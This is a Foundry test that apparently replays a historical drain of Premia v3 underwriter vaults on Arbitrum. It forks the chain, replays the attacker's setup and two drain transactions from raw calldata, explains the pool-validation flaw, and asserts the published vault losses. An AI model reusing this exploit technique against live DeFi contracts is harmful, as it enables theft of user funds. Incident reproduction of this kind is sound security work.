// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Premia v3 underwriter vaults (Arbitrum, 2026-11-01).
//
// Replay of the two drain transactions. The setup transaction 62 seconds earlier
// created six empty option pools through Premia's own factory. Each drain
// flash-borrows from Balancer, buys options from the vaults, and the vaults
// write collateral into those pools. UnderwriterVault._getPoolAddress returns
// any pool the factory has deployed (UnderwriterVault.sol:558-560), and
// _getQuoteInternal reverts only when that address is zero
// (UnderwriterVault.sol:686-688). There is no check that the pool has open
// interest or liquidity. The attacker-controlled pool then pays the written
// collateral back out through its fee claim.
//
//   setup  0xe3c263fcae544954367998e48e13112875cfd38a3b9a240e7818bb96313831f5  block 520166285
//   drain1 0x64602cbbeba5d3c7a5e2cff4f98cc118886fc6051c56fa50458abec2c90441ac  block 520166479
//   drain2 0xd7e8086df0570c5389ca27eb9bcdff290e810c094155b410a42e5bad2b3244ff  block 520166483

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract Premia_exp is Test {
    IERC20 internal constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 internal constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 internal constant USDCE = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 internal constant ARB = IERC20(0x912CE59144191C1204E64559FE8253a0e49E6548);

    address internal constant ATTACKER = 0xbeBa8CEfD0D75d747C5AD966Dc17C0Bb60D84dBd;
    address internal constant ATTACK = 0x577168C8c6fA937495C3D6961f1d7D734b2d785f;
    address internal constant WBTC_CALL = 0x45dF5EA836A15B561937Ae8373ab9eE984aea531;
    address internal constant WETH_CALL = 0xbae43c546DFADC69576aE73C68e0694A54F08e1B;
    address internal constant ARB_CALL = 0xDC631d88dbB5eb39f5c4Bf8B4e5298d098912fFf;
    address internal constant WBTC_PUT = 0x6A1FC0E1c60BA6564CDe4910A425F1F1a1d18C1F;
    address internal constant WETH_PUT = 0xD46993F25D298ebbCD31E941156C66f7e628A52a;
    address internal constant ARB_PUT = 0xBe3E229319f86F5EE96EE1Dc0B6D55e8b68a439e;

    // Calldata of the three transactions, in order. setup(), then run(0, 3, 0), then run(3, 6, 1).
    bytes internal constant SETUP = hex"64a7cece";
    bytes internal constant DRAIN1 =
        hex"bcea0a12000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000";
    bytes internal constant DRAIN2 =
        hex"bcea0a12000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000001";

    function setUp() public {
        // Parent of the setup transaction. Each later call rolls to its own block.
        vm.createSelectFork("http://127.0.0.1:8547", 520_166_284);
    }

    function testExploit() public {
        uint256 wbtcBefore = WBTC.balanceOf(WBTC_CALL);
        uint256 wethBefore = WETH.balanceOf(WETH_CALL);
        uint256 arbBefore = ARB.balanceOf(ARB_CALL);
        uint256 putWbtcBefore = USDCE.balanceOf(WBTC_PUT);
        uint256 putWethBefore = USDCE.balanceOf(WETH_PUT);
        uint256 putArbBefore = USDCE.balanceOf(ARB_PUT);
        uint256 attackerBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER, ATTACKER);
        vm.roll(520_166_285);
        vm.warp(1_793_502_877);
        (bool ok,) = ATTACK.call{value: 0.01 ether, gas: 80_000_000}(SETUP);
        require(ok, "setup");
        vm.roll(520_166_479);
        vm.warp(1_793_502_939);
        (ok,) = ATTACK.call{gas: 120_000_000}(DRAIN1);
        require(ok, "drain1");
        vm.roll(520_166_483);
        vm.warp(1_793_502_940);
        (ok,) = ATTACK.call{gas: 120_000_000}(DRAIN2);
        require(ok, "drain2");
        vm.stopPrank();

        uint256 wbtcLost = wbtcBefore - WBTC.balanceOf(WBTC_CALL);
        uint256 wethLost = wethBefore - WETH.balanceOf(WETH_CALL);
        uint256 arbLost = arbBefore - ARB.balanceOf(ARB_CALL);
        uint256 putWbtcLost = putWbtcBefore - USDCE.balanceOf(WBTC_PUT);
        uint256 putWethLost = putWethBefore - USDCE.balanceOf(WETH_PUT);
        uint256 putArbLost = putArbBefore - USDCE.balanceOf(ARB_PUT);

        emit log_named_decimal_uint("WBTC call vault lost", wbtcLost, 8);
        emit log_named_decimal_uint("WETH call vault lost", wethLost, 18);
        emit log_named_decimal_uint("ARB call vault lost", arbLost, 18);
        emit log_named_decimal_uint("WBTC put vault lost", putWbtcLost, 6);
        emit log_named_decimal_uint("WETH put vault lost", putWethLost, 6);
        emit log_named_decimal_uint("ARB put vault lost", putArbLost, 6);
        emit log_named_decimal_uint("attacker ETH delta", ATTACKER.balance - attackerBefore, 18);

        // Published net vault losses, after the premiums the attacker paid in.
        assertApproxEqAbs(wbtcLost, 3.64410382e8, 0.01e8, "WBTC");
        assertApproxEqAbs(wethLost, 43.47254568e18, 0.05e18, "WETH");
        assertApproxEqAbs(arbLost, 46_215.43e18, 1e18, "ARB");
        assertApproxEqAbs(putWbtcLost, 20_215.07e6, 1e6, "WBTC put");
        assertApproxEqAbs(putWethLost, 21_333.61e6, 1e6, "WETH put");
        assertApproxEqAbs(putArbLost, 6_930.68e6, 1e6, "ARB put");
        assertGt(ATTACKER.balance, attackerBefore, "attacker received nothing");
    }
}
